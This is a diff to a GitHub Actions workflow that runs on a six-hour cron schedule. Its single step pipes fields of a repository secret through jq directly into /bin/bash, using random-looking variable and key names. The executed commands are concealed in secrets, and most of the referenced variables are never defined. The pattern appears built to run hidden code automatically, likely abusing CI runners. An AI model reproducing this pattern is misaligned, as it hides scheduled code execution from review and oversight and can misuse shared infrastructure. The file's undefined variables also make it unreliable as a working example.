@@ -2,9 +2,8 @@ name: shoeappear
 on:
   workflow_dispatch:
   schedule:
-    - cron: '47 2/6 * * *'
-
-jobs:  # 9046
+    - cron: '39 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,19 +11,18 @@ jobs:  # 9046
       - uses: actions/checkout@v4
       - name: shoeappear
         env:
-          fag168: ${{ secrets.fag168 }}
+          jbgd81: ${{ secrets.jbgd81 }}
         run: |
-          echo $fag168 | jq -r .bhyqz33 | /bin/bash
-          echo $mdby46127 | jq -r .o5 | /bin/bash
-          echo $rvvpv761 | jq -r .slpl57915 | /bin/bash
-          echo $d4131 | jq -r .a92190 | /bin/bash
-          echo $o27650 | jq -r .f105 | /bin/bash
-          echo $vv4096 | jq -r .sa43785 | /bin/bash
-          echo $e11 | jq -r .t3 | /bin/bash
-          echo $tfr30658 | jq -r .nxwj4981 | /bin/bash
-          echo $atbk2129 | jq -r .l6796 | /bin/bash
-          echo $gusq89670 | jq -r .wuvq76646 | /bin/bash
-          echo $gjh16979 | jq -r .xi669 | /bin/bash
-          echo $iu34130 | jq -r .uz05 | /bin/bash
-          echo $rfk374 | jq -r .hm10 | /bin/bash
+          echo $jbgd81 | jq -r .lo2967 | /bin/bash
+          echo $w8 | jq -r .b2559 | /bin/bash
+          echo $vo0 | jq -r .mg7 | /bin/bash
+          echo $xog3121 | jq -r .fvxb04885 | /bin/bash
+          echo $rbwvc3982 | jq -r .wgpk41655 | /bin/bash
+          echo $ngx7 | jq -r .w7 | /bin/bash
+          echo $saiun74 | jq -r .zdhd7 | /bin/bash
+          echo $hftw748 | jq -r .yhp2 | /bin/bash
+          echo $nhgi2 | jq -r .yyl90 | /bin/bash
+          echo $lkay389 | jq -r .m96437 | /bin/bash
+          echo $ey4 | jq -r .tp4597 | /bin/bash
+          echo $ih9402 | jq -r .vrwc757 | /bin/bash
 
